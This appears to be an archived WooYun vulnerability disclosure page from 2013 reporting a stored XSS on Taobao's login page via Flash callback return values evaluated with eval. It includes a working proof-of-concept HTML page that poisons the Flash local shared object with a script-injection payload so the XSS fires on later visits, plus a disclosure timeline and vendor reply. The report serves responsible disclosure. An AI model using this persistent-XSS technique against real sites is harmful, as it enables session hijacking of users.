@@ -1,0 +1,232 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		一个flash的0day导致的淘宝网存储xss(可形成永久后门)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		一个flash的0day导致的淘宝网存储xss(可形成永久后门)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/neobyte">neobyte</a> 
+</li><li>提交时间：		2013-10-12 13:00</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-10-12：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-10-12：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-10-22：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-11-01：	细节向普通白帽子公开<br/>
+									2013-11-11：	细节向实习白帽子公开<br/>
+									2013-11-26：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">淘宝的存储XSS,其实是利用了flash的0day,但预计很多网站都受影响...</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">关于flash的XSS,除了常见的一些技巧外,目前已知的比较偏门的两类是:<br />
+<br />
+1.ExternalInterface.call的第二个参数,主要利用\&quot;,catch(e){}//,wooyun上有很多例子<br />
+<br />
+2.在IE下,当flash调用ExternalInterface.addCallback时,如果object的id可控.<br />
+<br />
+但需要注意的是:当js调用flash暴露出来的callback时,返回值也是一个敏感点!这个在wooyun上并没有看到有人提及,也许被很多人忽视了.<br />
+<br />
+首先来看看js是如何处理flash的callback的:<br />
+<br />
+1.在ie下,其实是<br />
+<br />
+</p><pre><code>eval(instance.CallFunction(&quot;&lt;invoke name=\&quot;&quot;+name+&quot;\&quot; returntype=\&quot;javascript\&quot;&gt;&quot; + __flash__argumentsToXML(arguments,0) + &quot;&lt;/invoke&gt;&quot;));</code></pre><p class='detail'><br />
+<br />
+2.在FF与Chrome等其他浏览器下,其实是<br />
+<br />
+</p><pre><code>eval(var __flash_temp = &quot;returned value&quot;; __flash_temp;)</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+注意到这里都调用了eval,再结合ExternalInterface.call的那个0 day, 利用方式也就呼之欲出了. <br />
+<br />
+所以只要js中调用了callback函数,而返回值又可被攻击者控制的话,就可以造成xss. IE, Chrome, FF等浏览器均受影响.<br />
+<br />
+一般的,如果你利用js来读取flash的LSO的话,那么就很有可能中招. 注意不管你是否在js里是否对过滤读取出的数据,也不管你读取出数据后是否用于DOM操作,仅仅读取这个动作就会触发XSS.<br />
+<br />
+<br />
+<br />
+实例:<br />
+<br />
+https://login.taobao.com<br />
+<br />
+这个页面自动加载一个JSocket.swf,这个flash会添加二个callback函数,分别是getlso与setlso.<br />
+<br />
+如果用户访问某个恶意站点的过程中其LSO被篡改,那么当其以后访问login.taobao.com时就触发xss. 由于LSO是持久的,所以利用这个xss劫持用户也是可能的.<br />
+<br />
+<br />
+<br />
+下面是POC(渣代码见谅),访问这个html后再访问login.taobao.com就会触发XSS<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;object id=&quot;JSocket&quot; tabindex=&quot;-1&quot; classid=&quot;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&quot; width=&quot;1&quot; height=&quot;1&quot; codebase=&quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab&quot;&gt;<br />
+       &lt;param name=&quot;movie&quot; value=&quot;http://acjstb.aliyun.com/actionlog/flash/JSocket.swf&quot;&gt;<br />
+       &lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot;&gt;<br />
+       &lt;embed name=&quot;JSocket&quot; src=&quot;http://acjstb.aliyun.com/actionlog/flash/JSocket.swf&quot; width=&quot;1&quot; height=&quot;1&quot; allowscriptaccess=&quot;always&quot; type=&quot;application/x-shockwave-flash&quot; pluginspage=&quot;http://www.adobe.com/go/getflashplayer&quot;&gt;<br />
+&lt;/object&gt;<br />
+&lt;script&gt;<br />
+function set(){document[&#039;JSocket&#039;].setlso(&#039;aa\\&quot;;alert(document.domain);//aa&#039;);}<br />
+setTimeout(&quot;set()&quot;,5000);<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">1. Chrome下<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/121247085f7ecfde6e096db385a362476645943b.png" target="_blank"><img src="../images/121247085f7ecfde6e096db385a362476645943b.png" alt="chrome.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2. IE下,顺便验证一下domain<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/12124804b149ca352d2d42b240da150f3e9a4dd6.png" target="_blank"><img src="../images/12124804b149ca352d2d42b240da150f3e9a4dd6.png" alt="IE.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">怎么检查ExternalInterface.call的输入参数,就怎么处理callback的返回值吧 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/neobyte" title="neobyte">neobyte</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-039481" title="一个flash的0day导致的淘宝网存储xss(可形成永久后门)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：8 </p>
+													<p class="detail">确认时间：2013-10-12 16:44</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢你对我们的支持与关注，该问题我们正在修复~~</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="39481";
+var bugRating="2";
+var myRating="";
+var ratingCount="7";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
